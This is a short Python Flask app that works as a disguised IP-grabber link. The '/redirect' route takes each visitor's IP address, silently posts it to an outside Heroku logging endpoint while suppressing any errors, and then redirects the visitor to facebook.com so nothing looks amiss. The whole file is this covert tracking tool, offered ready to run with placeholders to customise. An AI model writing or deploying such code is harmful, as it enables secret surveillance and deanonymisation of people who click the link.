from flask import Flask, request, redirect
import requests

app = Flask(__name__)

@app.route('/redirect', methods=['GET'])
def send_ip_and_redirect():
    # Extract the client's IP address
    client_ip = request.remote_addr

    # Send the IP address to another server
    target_server_url = "https://fierce-taiga-74419-a4096f5f32ff.herokuapp.com/log_ip"  # Replace with your target server URL
    payload = {"ip": client_ip}
    
    try:
        # Send the IP as a POST request
        requests.post(target_server_url, json=payload)
    except Exception as e:
        # Silently handle exceptions without logging
        pass

    # Redirect the user to the target URL
    target_url = "https://facebook.com"  # Replace with your target URL
    return redirect(target_url)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
